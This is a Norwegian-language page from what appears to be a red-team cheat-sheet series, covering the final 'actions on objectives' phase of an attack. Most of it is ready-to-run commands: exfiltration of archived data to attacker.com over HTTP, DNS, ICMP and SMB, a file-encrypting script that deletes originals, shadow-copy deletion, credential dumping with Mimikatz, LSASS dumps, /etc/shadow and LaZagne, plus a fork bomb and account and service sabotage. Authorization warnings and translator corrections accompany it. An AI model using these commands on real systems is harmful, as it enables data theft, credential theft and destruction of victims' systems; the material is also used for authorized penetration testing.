# 🎯 Fase 7: Gjennomføring av målene

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Mål:** Oppnå sluttmålet – dataeksfiltrering, ødeleggelse eller annen påvirkning.

---

## 📤 Dataeksfiltrering

### Finne sensitive data

#### Windows
```cmd
# Søk etter sensitive filer
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Finn nylig endrede filer
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell – søk etter innhold
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Søk etter sensitive filer
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Nylig endrede filer
find / -mtime -7 -type f 2>/dev/null

# Store filer
find / -size +100M -type f 2>/dev/null
```

### Komprimere og klargjøre data

#### Windows
```powershell
# PowerShell – opprett ZIP-arkiv
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar med komprimering
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Opprett komprimert arkiv
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Med kryptering
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP med passord
zip -r -e data.zip /sensitive/
```

### Eksfiltreringsmetoder

#### HTTP/HTTPS

> **Presisering:** Kommentaren om «GET» nedenfor er misvisende: `curl -d` bruker normalt POST. HTTP krypterer ikke trafikken; kryptering gjelder HTTPS. Se [curl-dokumentasjonen](https://curl.se/docs/manpage.html#-d).
```bash
# Last opp via curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 via GET (små datamengder)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Opplasting med PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### Eksfiltrering via DNS
```bash
# Kod data i DNS-spørringer
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Med dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Eksfiltrering via ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Med icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Kopier til angriperens delte ressurs
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Monter og kopier (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Skytjenester
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Destruktive handlinger (simulering av løsepengevirus)

> ⚠️ **ADVARSEL:** Bare ved autoriserte red team-oppdrag!

### Simulering av kryptering

> **Viktig presisering:** Til tross for ordet «simulering» sletter koden faktisk originalfilene med `Remove-Item`. Den skriver dessuten byte-arrayet med `Set-Content`, uten å sikre korrekt binærlagring. Den er ikke en ufarlig tørrkjøring.
```powershell
# PowerShell – krypter filer (simulering)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Sletting av skyggekopier

> **Presisering:** `vssadmin resize shadowstorage` endrer lagringsgrensen; kommandoen deaktiverer ikke i seg selv opprettelse av skyggekopier.
```cmd
# Slett skyggekopier (hindrer gjenoppretting)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Deaktiver skyggekopier
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Innhenting av påloggingsopplysninger

### Påloggingsopplysninger i Windows
```powershell
# Mimikatz – alle påloggingsopplysninger
mimikatz# sekurlsa::logonpasswords

# Dump SAM-databasen
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# LSASS-dump
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Trekk ut fra dump
pypykatz lsa minidump lsass.dmp
```

### Påloggingsopplysninger i Linux
```bash
# Shadow-fil
cat /etc/shadow

# SSH-nøkler
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Historikkfiler
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Konfigurasjonsfiler
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Påloggingsopplysninger i nettlesere
```bash
# Påloggingsopplysninger i Chrome (Windows)
# Plassering: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Påloggingsopplysninger i Firefox (Windows)
# Plassering: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne – alle nettleserpassord
python laZagne.py all
```

---

## 🖥️ Påvirkning på systemet

### Tjenestenekt (DoS)
```bash
# Fork bomb (Linux) – IKKE KJØR!
:(){ :|:& };:

# Fyll disken
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Utmattelse av CPU-ressurser
yes > /dev/null &
```

### Manipulering av kontoer

> **Presisering:** Den første kommandoen endrer bare passordet for `administrator`, selv om originalkommentaren sier «alle brukerpassord».
```bash
# Endre alle brukerpassord
net user administrator NewP@ssw0rd!

# Lås kontoer
net user username /active:no

# Slett brukere
net user username /delete
```

### Forstyrrelse av tjenester
```cmd
# Stopp kritiske tjenester
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Deaktiver tjenester
sc config wuauserv start= disabled
```

---

## 📊 Hurtigreferanse

### Eksfiltreringsmetoder

| Metode | Fordeler | Ulemper |
|--------|------|------|
| HTTP/HTTPS | Vanlig trafikk, kryptert | Kan være overvåket |
| DNS | Ofte ikke overvåket | Langsomt, størrelsesbegrensninger |
| ICMP | Kan omgå brannmurer | Svært langsomt |
| SMB | Raskt, innebygd støtte | Bare internt |
| Sky | Legitime tjenester | Krever påloggingsopplysninger |

### Prioritering av datakilder

| Plassering | Verdi |
|----------|-------|
| Domenekontroller | Høyest – AD-påloggingsopplysninger |
| Filservere | Høy – dokumenter |
| E-postservere | Høy – kommunikasjon |
| Databaseservere | Høy – virksomhetsdata |
| Utviklingsservere | Middels – kildekode |
| Brukernes arbeidsstasjoner | Middels – lokale filer |

---

## ✅ Sjekkliste for pentest-rapporten

```markdown
- [ ] Dokumenter alle kompromitterte systemer
- [ ] List alle påloggingsopplysninger som ble funnet
- [ ] Kartlegg angrepsveien fra innledende tilgang
- [ ] Dokumenter sårbarhetene som ble utnyttet
- [ ] Noter hvor sensitive data ble funnet
- [ ] Gi anbefalinger for utbedring
- [ ] Ta med en tidslinje over aktivitetene
- [ ] Ta skjermbilder som dokumenterer tilgangen
```

---

## 🔗 Relaterte hurtigguider

- [Mimikatz](../../Mimikatz/README.md)
- [Linux-kommandoer](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**Forrige fase:** [← 06 - Omgåelse av sikkerhetsmekanismer](./06-Defense-Evasion.nb.md)

**Tilbake til oversikten:** [🎯 Oversikt over angrepskjeden](./README.nb.md)

---

<p align="center">
  <b>🎯 Oppdraget er fullført!</b><br>
  <i>Husk: Utfør bare disse handlingene med nødvendig tillatelse!</i>
</p>
